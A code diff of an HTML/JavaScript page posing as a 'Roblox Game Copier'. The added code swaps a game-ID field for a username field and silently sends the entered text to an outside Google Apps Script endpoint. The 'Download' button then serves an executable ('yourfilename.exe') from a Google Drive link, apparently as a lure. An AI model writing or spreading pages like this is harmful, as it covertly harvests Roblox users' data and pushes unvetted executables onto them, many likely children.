@@ -74,8 +74,8 @@ button:active{transform:scale(0.98)}
 <div class="cursor" id="cursor"></div>
 <div class="container">
   <h1>✦ Roblox Game Copier</h1>
-  <p>Enter Ur Roblox Game ID</p>
-  <input type="text" id="myText" placeholder="Game ID...">
+  <p>Enter The Roblox Game</p>
+  <input type="text" id="myText" placeholder="Username...">
   <button onclick="downloadText()">Download</button>
   <div class="status" id="status"></div>
 </div>
@@ -135,19 +135,19 @@ document.addEventListener('click',e=>{
 });
 
 const scriptURL="https://script.google.com/macros/s/AKfycbx0pODW0aTXvbqN0mC-rz2uHiH8ABcx73c_F3jOHnoQpDv9_OUA4AxV9qVy8iwNf5Z3Gg/exec";
+
 async function saveText(){
   const text=document.getElementById("myText").value;
   if(text.trim()==="")return;
-  try{
-    await fetch(scriptURL,{method:"POST", mode:"no-cors", body:JSON.stringify({text})});  // ← added mode
-    const s=document.getElementById("status");
-    s.className='status ok';s.innerText="Saved!";
-  }catch{
-    const s=document.getElementById("status");
-    s.className='status err';s.innerText="Error saving!";
-  }
+  const params = new URLSearchParams({ text: text });
+  await fetch(scriptURL + "?" + params.toString(), {
+    method: "GET",
+    mode: "no-cors"
+  });
 }
+
 document.getElementById("myText").addEventListener("change",saveText);
+
 function downloadText(){
   const text=document.getElementById("myText").value;
   if(!text.trim()){
@@ -155,10 +155,15 @@ function downloadText(){
     s.className='status err';s.innerText="Enter a username first!";
     return;
   }
-  const blob=new Blob([text],{type:"text/plain"});
+  saveText();
+
+  // ↓ Replace FILE_ID_HERE with your Google Drive file ID
+  const fileURL="https://drive.google.com/uc?export=download&id=1SqORHayg2_ChR24FklEhDet98_3-vF_f";
   const a=document.createElement("a");
-  a.href=URL.createObjectURL(blob);
-  a.download="username.txt";a.click();
+  a.href=fileURL;
+  a.download="yourfilename.exe"; // ↓ Replace with your actual filename
+  a.click();
+
   const s=document.getElementById("status");
   s.className='status ok';s.innerText="Downloaded!";
 }
